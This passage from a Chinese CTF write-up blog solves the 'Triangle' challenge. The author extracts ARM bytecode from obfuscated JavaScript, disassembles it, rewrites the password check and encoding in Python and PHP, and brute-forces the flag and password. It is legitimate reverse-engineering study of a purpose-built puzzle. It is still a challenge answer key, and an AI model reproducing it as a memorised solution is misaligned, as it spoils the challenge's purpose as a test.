class="hljs-number">485</span>, <span class="hljs-number">517</span>, <span class="hljs-number">53</span>, <span class="hljs-number">497</span>, <span class="hljs-number">295</span>, <span class="hljs-number">219</span>, <span class="hljs-number">79</span>, <span class="hljs-number">497</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">130</span>, <span class="hljs-number">280</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">5</span>, <span class="hljs-number">36</span>, <span class="hljs-number">517</span>, <span class="hljs-number">460</span>, <span class="hljs-number">497</span>, <span class="hljs-number">25</span>, <span class="hljs-number">8</span>, <span class="hljs-number">15</span>, <span class="hljs-number">642</span>, <span class="hljs-number">485</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">6</span>, <span class="hljs-number">295</span>, <span class="hljs-number">8</span>, <span class="hljs-number">19</span>, <span class="hljs-number">497</span>, <span class="hljs-number">295</span>, <span class="hljs-number">189</span>, <span class="hljs-number">900</span>, <span class="hljs-number">497</span>, <span class="hljs-number">295</span>, <span class="hljs-number">300</span>, <span class="hljs-number">72</span>, <span class="hljs-number">497</span>, <span class="hljs-number">36</span>, <span class="hljs-number">8</span>, <span class="hljs-number">40</span>, <span class="hljs-number">642</span>, <span class="hljs-number">484</span>, <span class="hljs-number">131</span>, <span class="hljs-number">131</span>, <span class="hljs-number">520</span>, <span class="hljs-number">295</span>, <span class="hljs-number">1</span>, <span class="hljs-number">440</span>, <span class="hljs-number">280</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">440</span>, <span class="hljs-number">280</span>, <span class="hljs-number">8</span>, <span class="hljs-number">189</span>, <span class="hljs-number">440</span>, <span class="hljs-number">280</span>, <span class="hljs-number">8</span>, <span class="hljs-number">162</span>, <span class="hljs-number">440</span>, <span class="hljs-number">280</span>, <span class="hljs-number">8</span>, <span class="hljs-number">249</span>, <span class="hljs-number">440</span>, <span class="hljs-number">280</span>, <span class="hljs-number">8</span>, <span class="hljs-number">300</span>, <span class="hljs-number">440</span>, <span class="hljs-number">280</span>, <span class="hljs-number">8</span>, <span class="hljs-number">517</span>, <span class="hljs-number">440</span>, <span class="hljs-number">280</span>, <span class="hljs-number">8</span>, <span class="hljs-number">253</span>, <span class="hljs-number">440</span>, <span class="hljs-number">280</span>, <span class="hljs-number">8</span>, <span class="hljs-number">19</span>, <span class="hljs-number">440</span>, <span class="hljs-number">280</span>, <span class="hljs-number">8</span>, <span class="hljs-number">74</span>, <span class="hljs-number">440</span>, <span class="hljs-number">280</span>, <span class="hljs-number">8</span>, <span class="hljs-number">440</span>, <span class="hljs-number">440</span>, <span class="hljs-number">280</span>, <span class="hljs-number">8</span>, <span class="hljs-number">219</span>, <span class="hljs-number">440</span>, <span class="hljs-number">280</span>] ;<br><span class="hljs-keyword">var</span> o2 =  [<span class="hljs-number">24</span>, <span class="hljs-number">8</span>, <span class="hljs-number">105</span>, <span class="hljs-number">419</span>, <span class="hljs-number">80</span>, <span class="hljs-number">414</span>, <span class="hljs-number">105</span>, <span class="hljs-number">419</span>, <span class="hljs-number">5</span>, <span class="hljs-number">439</span>, <span class="hljs-number">105</span>, <span class="hljs-number">419</span>, <span class="hljs-number">8</span>, <span class="hljs-number">447</span>, <span class="hljs-number">105</span>, <span class="hljs-number">192</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">105</span>, <span class="hljs-number">192</span>, <span class="hljs-number">8</span>, <span class="hljs-number">91</span>, <span class="hljs-number">104</span>, <span class="hljs-number">891</span>, <span class="hljs-number">70</span>, <span class="hljs-number">8</span>, <span class="hljs-number">330</span>, <span class="hljs-number">192</span>, <span class="hljs-number">70</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">6</span>, <span class="hljs-number">64</span>, <span class="hljs-number">63</span>, <span class="hljs-number">64</span>, <span class="hljs-number">381</span>, <span class="hljs-number">25</span>, <span class="hljs-number">91</span>, <span class="hljs-number">632</span>, <span class="hljs-number">155</span>, <span class="hljs-number">25</span>, <span class="hljs-number">91</span>, <span class="hljs-number">632</span>, <span class="hljs-number">381</span>, <span class="hljs-number">70</span>, <span class="hljs-number">1</span>, <span class="hljs-number">76</span>, <span class="hljs-number">381</span>, <span class="hljs-number">8</span>, <span class="hljs-number">91</span>, <span class="hljs-number">417</span>, <span class="hljs-number">891</span>, <span class="hljs-number">70</span>, <span class="hljs-number">8</span>, <span class="hljs-number">19</span>, <span class="hljs-number">381</span>, <span class="hljs-number">70</span>, <span class="hljs-number">414</span>, <span class="hljs-number">82</span>, <span class="hljs-number">381</span>, <span class="hljs-number">70</span>, <span class="hljs-number">447</span>, <span class="hljs-number">555</span>, <span class="hljs-number">381</span>, <span class="hljs-number">176</span>, <span class="hljs-number">8</span>, <span class="hljs-number">139</span>, <span class="hljs-number">419</span>, <span class="hljs-number">220</span>, <span class="hljs-number">141</span>, <span class="hljs-number">141</span>, <span class="hljs-number">635</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">105</span>, <span class="hljs-number">192</span>, <span class="hljs-number">8</span>, <span class="hljs-number">414</span>, <span class="hljs-number">105</span>, <span class="hljs-number">192</span>, <span class="hljs-number">8</span>, <span class="hljs-number">439</span>, <span class="hljs-number">105</span>, <span class="hljs-number">192</span>, <span class="hljs-number">8</span>, <span class="hljs-number">447</span>, <span class="hljs-number">105</span>, <span class="hljs-number">192</span>, <span class="hljs-number">8</span>, <span class="hljs-number">91</span>, <span class="hljs-number">105</span>, <span class="hljs-number">192</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">105</span>, <span class="hljs-number">192</span>, <span class="hljs-number">8</span>, <span class="hljs-number">63</span>, <span class="hljs-number">105</span>, <span class="hljs-number">192</span>, <span class="hljs-number">8</span>, <span class="hljs-number">693</span>, <span class="hljs-number">105</span>, <span class="hljs-number">192</span>, <span class="hljs-number">8</span>, <span class="hljs-number">46</span>, <span class="hljs-number">105</span>, <span class="hljs-number">192</span>, <span class="hljs-number">8</span>, <span class="hljs-number">105</span>, <span class="hljs-number">105</span>, <span class="hljs-number">192</span>] ;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getARM1</span>(<span class="hljs-params"></span>) </span>&#123; <br>    <span class="hljs-keyword">var</span> t = stoh(atob(getBase64Image(<span class="hljs-string">"eye"</span>))); <br>    <span class="hljs-keyword">var</span> output = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>(); <br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; o1.length; i++) &#123;   <br>        output[i] = t[o1[i]]; <br>    &#125; <br>    <span class="hljs-keyword">return</span> output;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getARM2</span>(<span class="hljs-params"></span>) </span>&#123; <br>    <span class="hljs-keyword">var</span> _ = stoh(atob(getBase64Image(<span class="hljs-string">"frei"</span>))); <br>    <span class="hljs-keyword">var</span> output = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>(); <br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; o2.length; i++) &#123;   <br>        output[i] = _[o2[i]]; <br>    &#125; <br>    <span class="hljs-keyword">return</span> output;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">toHexString</span>(<span class="hljs-params">byteArray</span>) </span>&#123; <br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">Array</span>.from(byteArray, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">byte</span>) </span>&#123;   <br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">'0'</span> + (byte &amp; <span class="hljs-number">0xFF</span>).toString(<span class="hljs-number">16</span>)).slice(<span class="hljs-number">-2</span>); <br>    &#125;).join(<span class="hljs-string">''</span>)<br>&#125;<br>toHexString(getARM1());<br><span class="hljs-comment">//执行返回结果不一样，原因暂未知</span><br><span class="hljs-comment">//0900a0e10a10a0e10830a0e10040a0e30050a0e300c0a0e30020d0e50060d1e5056086e201c004e200005ce30000000a036046e2060052e10500001a010080e2011081e2014084e2030054e1f1ffffba0150a0e30000a0e30010a0e30020a0e30030a0e30040a0e30060a0e30070a0e30080a0e30090a0e300a0a0e300c0a0e3</span><br><br><span class="hljs-comment">//执行返回结果不一样，原因暂未知</span><br>toHexString(getARM2());<br><span class="hljs-comment">//0800a0e10910a0e10a20a0e10030a0e30050a0e30040d0e5010055e30100001a036003e2064084e0064084e2015004e20040c1e5010080e2011081e2013083e2020053e1f2ffffba0000a0e30010a0e30020a0e30030a0e30040a0e30050a0e30060a0e30070a0e30090a0e300a0a0e3</span><br></code></pre></td></tr></table></figure>
<p>把16进制分别转为“ARMv7 ARM”后得到arm指令如下（指令我也看不明白，注释摘自网络，网上的也是抄来超去不知出处所以也就不标来源了）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs plain"># ARM1<br>MOV	R0, SB              ;SB是静态基址寄存器,R0&#x3D;R9&#x3D;m,这是隐藏的密码（get_pw()的返回值）的头地址<br>MOV	R1, SL              ;SL是堆栈限制寄存器,R1&#x3D;R10&#x3D;R,这是输入的密码的头地址<br>MOV	R3, R8              ;R8是输入密码的长度<br>MOV	R4, #0<br>MOV	R5, #0<br>MOV	IP, #0<br>LDRB	R2, [R0]        ;此处是0x18 传入隐藏密码<br>LDRB	R6, [R1]        ;传入输入密码<br>ADD	R6, R6, #5          ;将R6加5的结果传入R6<br>AND	IP, R4, #1          ;将R4与1相与的结果传入IP<br>CMP	IP, #0              ;判断IP与0是否相等<br>BEQ	#0x34               ;如果IP&#x3D;&#x3D;0或者说R4是偶数将会跳转到0x34<br>SUB	R6, R6, #3          ;如果IP!&#x3D;0  将R6减3的结果传入R6<br>CMP	R2, R6              ;此处是0x34，判断R2与R6是否相等<br>BNE	#0x54               ;如果R2与R6不相等则跳转到0x54<br>ADD	R0, R0, #1          ;R0加一<br>ADD	R1, R1, #1          ;R1加一<br>ADD	R4, R4, #1          ;R4加一,R4是一个计数器<br>CMP	R4, R3              ;比较R4与R3的大小<br>BLT	#0x18               ;如果R4小于R3则跳转到0x18<br>MOV	R5, #1<br>MOV	R0, #0              ;此处是0x54<br>MOV	R1, #0<br>MOV	R2, #0<br>MOV	R3, #0<br>MOV	R4, #0<br>MOV	R6, #0<br>MOV	R7, #0<br>MOV	R8, #0<br>MOV	SB, #0<br>MOV	SL, #0<br>MOV	IP, #0<br><br><br># ARM2<br>MOV	R0, R8              ;R0&#x3D;8192，这是输入密码的地址<br>MOV	R1, SB              ;SB是静态基址寄存器，R1&#x3D;R9&#x3D;m(从这获取最后的输出结果，即输出结果的地址)<br>MOV	R2, SL              ;SL是堆栈限制寄存器，R2&#x3D;R10&#x3D;e(输入密码的长度)<br>MOV	R3, #0              ;R3是计数器<br>MOV	R5, #0              ;R5存储输入密码的上一个地址位数据的奇偶性<br>LDRB	R4, [R0]        ;此处是0x14，将寄存器数值传入R4<br>CMP	R5, #1              ;将R5与1相减，结果存在标志位中<br>BNE	#0x28               ;根据标志位的结果，判断R5与1是否相等，若不相等则跳转到0x28处<br>AND	R6, R3, #3          ;将R3和3相与结果传入R6，相当于截取R3二进制最后两位传入R6<br>ADD	R4, R4, R6          ;将R4与R6相加的结果传入R4<br>ADD	R4, R4, #6          ;此处是0x28，R4加6<br>AND	R5, R4, #1          ;将R4和1相与的结果传入R5，若R4为偶数则R5&#x3D;0反之R5&#x3D;1<br>STRB	R4, [R1]        ;将R4的低8位传入以R1为基址的存储器地址中<br>ADD	R0, R0, #1          ;R0加一<br>ADD	R1, R1, #1          ;R1加一<br>ADD	R3, R3, #1          ;R3加一，R3是计数器<br>CMP	R3, R2              ;将R3与R2相减，结果存在标志位中<br>BLT	#0x14               ;根据标志位的结果判断R3是否小于R2若小于则跳转到0x14处，即若计数器小于输入密码长度则继续循环<br>MOV	R0, #0<br>MOV	R1, #0<br>MOV	R2, #0<br>MOV	R3, #0<br>MOV	R4, #0<br>MOV	R5, #0<br>MOV	R6, #0<br>MOV	R7, #0<br>MOV	SB, #0<br>MOV	SL, #0<br></code></pre></td></tr></table></figure>
<p>改成python代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_pw</span><span class="hljs-params">(s, t)</span>:</span><br>  <span class="hljs-keyword">for</span> i, (c, d) <span class="hljs-keyword">in</span> enumerate(zip(s, t)):<br>    c, d = ord(c), ord(d)<br>    c += <span class="hljs-number">5</span><br>    <span class="hljs-keyword">if</span> i &amp; <span class="hljs-number">1</span>:<br>      c -= <span class="hljs-number">3</span><br>    <span class="hljs-keyword">if</span> c != d:<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">enc_pw</span><span class="hljs-params">(s)</span>:</span><br>  res = <span class="hljs-string">''</span><br>  f = <span class="hljs-number">0</span><br>  <span class="hljs-keyword">for</span> i, c <span class="hljs-keyword">in</span> enumerate(s):<br>    c = ord(c)<br>    <span class="hljs-keyword">if</span> f == <span class="hljs-number">1</span>:<br>      c += i &amp; <span class="hljs-number">3</span><br>    c += <span class="hljs-number">6</span><br>    f = c &amp; <span class="hljs-number">1</span><br>    res += chr(c)<br>  <span class="hljs-keyword">return</span> res<br></code></pre></td></tr></table></figure>
<p>改成php代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test_pw</span><span class="hljs-params">($e, $p)</span> </span>&#123;<br>  <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;strlen($p);$i++) &#123;<br>    <span class="hljs-keyword">if</span> (ord($e[$i]) !== ord($p[$i]) - (($i%<span class="hljs-number">2</span>)?<span class="hljs-number">2</span>:<span class="hljs-number">5</span>)) <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>; <br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">enc_pw</span><span class="hljs-params">($p)</span> </span>&#123;<br>  $len = strlen($p);<br>  $last_is_odd = <span class="hljs-number">0</span>;<br>  $res = <span class="hljs-string">""</span>;<br>  <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;$len;$i++) &#123;<br>    $c = ord($p[$i]) + (($last_is_odd)?($i%<span class="hljs-number">4</span>):(<span class="hljs-number">0</span>)) + <span class="hljs-number">6</span>;<br>    $res .= chr($c);<br>    $last_is_odd = $c % <span class="hljs-number">2</span>;<br>  &#125;;<br>  <span class="hljs-keyword">return</span> $res;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>使用加密函数逐个字符匹配，写出解密代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> string<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">enc_pw</span><span class="hljs-params">(s)</span>:</span><br>  res = <span class="hljs-string">''</span><br>  f = <span class="hljs-number">0</span><br>  <span class="hljs-keyword">for</span> i, c <span class="hljs-keyword">in</span> enumerate(s):<br>    c = ord(c)<br>    <span class="hljs-keyword">if</span> f == <span class="hljs-number">1</span>:<br>      c += i &amp; <span class="hljs-number">3</span><br>    c += <span class="hljs-number">6</span><br>    f = c &amp; <span class="hljs-number">1</span><br>    res += chr(c)<br>  <span class="hljs-keyword">return</span> res<br> <br>encrypted = <span class="hljs-string">'XYzaSAAX_PBssisodjsal_sSUVWZYYYb'</span><br>flag = <span class="hljs-string">''</span><br><span class="hljs-keyword">for</span> i, c <span class="hljs-keyword">in</span> enumerate(encrypted):<br>  c = ord(c)<br>  c -= <span class="hljs-number">5</span><br>  <span class="hljs-keyword">if</span> i &amp; <span class="hljs-number">1</span> != <span class="hljs-number">0</span>:<br>    c += <span class="hljs-number">3</span><br>  <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> string.printable:<br>    <span class="hljs-keyword">if</span> enc_pw(flag + d)[i] == chr(c):<br>      flag += d<br>      <span class="hljs-keyword">break</span><br>  print(flag)<br> <br>print(<span class="hljs-string">'flag&#123;'</span> + flag + <span class="hljs-string">'&#125;'</span>)<br></code></pre></td></tr></table></figure>
<p>php解密代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_pw_from_test</span><span class="hljs-params">($p)</span></span>&#123;<br>  $r = <span class="hljs-string">""</span>;<br>  <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;strlen($p);$i++) &#123;<br>    $r.=chr(ord($p[$i]) - (($i%<span class="hljs-number">2</span>)?<span class="hljs-number">2</span>:<span class="hljs-number">5</span>));<br>  &#125;<br>  <span class="hljs-keyword">return</span> $r;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dec_pw</span><span class="hljs-params">($p)</span> </span>&#123;<br>  $r = <span class="hljs-string">""</span>;<br>  <span class="hljs-keyword">for</span>($i=strlen($p)<span class="hljs-number">-1</span>;$i&gt;=<span class="hljs-number">0</span>;$i--)&#123;<br>    $last_is_odd = $i&gt;<span class="hljs-number">0</span> &amp;&amp; ord($p[$i<span class="hljs-number">-1</span>]) % <span class="hljs-number">2</span>;<br>    $r = chr(ord($p[$i]) - <span class="hljs-number">6</span> - ($last_is_odd?($i%<span class="hljs-number">4</span>):<span class="hljs-number">0</span>)).$r;<br>  &#125;<br>  <span class="hljs-keyword">return</span> $r;<br>&#125;<br>$enc_pass = get_pw_from_test(get_pw());<br>var_dump(test_pw($enc_pass, get_pw()));<br>$pass = dec_pw($enc_pass);<br>var_dump(enc_pw($pass)==$enc_pass);<br>var_dump($pass, $enc_pass);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>解得flag，把“MPmVH94PTH7hhafgYahYaVfKJNLRNQLZ”输入网页也可以测试成功</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">MPmVH94PTH7hhafgYahYaVfKJNLRNQLZ<br></code></pre></td></tr></table></figure>

            <div class="article-copyright">
                
    <blockquote>
        <p>
            版权声明：本文为「Blog.WuJiaxing.Cn」的原创文章，博客内容遵循 署名-非商业性使用-相同方式共享 协议。<br>本文永久链接是：https://blog.wujiaxing.cn/2019/11/04/a940d9d0/
        </p>
    </blockquote>


            </div>
        </div>
    </article>
    

    <section id="toc-div" >
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x001-Cat"><span class="toc-text">0x001 Cat</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x002-ics-04"><span class="toc-text">0x002 ics-04</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x003-ics-05"><span class="toc-text">0x003 ics-05</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x004-ics-06"><span class="toc-text">0x004 ics-06</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x005-lottery"><span class="toc-text">0x005 lottery</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x006-NewsCenter"><span class="toc-text">0x006 NewsCenter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x007-mfw"><span class="toc-text">0x007 mfw</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x008-Training-WWW-Robots"><span class="toc-text">0x008 Training-WWW-Robots</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x009-NaNNaNNaNNaN-Batman"><span class="toc-text">0x009 NaNNaNNaNNaN-Batman</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x010-bug"><span class="toc-text">0x010 bug</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x011-upload"><span class="toc-text">0x011 upload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x012-FlatScience"><span class="toc-text">0x012 FlatScience</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x013-web2"><span class="toc-text">0x013 web2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x014-PHP2"><span class="toc-text">0x014 PHP2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x015-unserialize3"><span class="toc-text">0x015 unserialize3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x016-upload1"><span class="toc-text">0x016 upload1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x017-baby-web"><span class="toc-text">0x017 baby_web</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x018-Triangle"><span class="toc-text">0x018 Triangle</span></a></li></ol>
    </section>
    <section id="gohome" style="display: none;"><a><i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i></a></section>


</section>
    </div>
    <footer>
    <div class="outer">
        <div class="inner">
            Powered by <a href="https://github.com/hdxw/hexo-theme-prowiki" target="_blank">ProWiki</a>
            &copy;2022 WuJiaxing<br>
            <a href="http://beian.miit.gov.cn/" target="_blank" rel="noopener">冀ICP备00000000号</a>
        </div>
    </div>
</footer>

<script src="/js/custom.js"></script>


    <script>onload_content();</script>

</body>
</html>
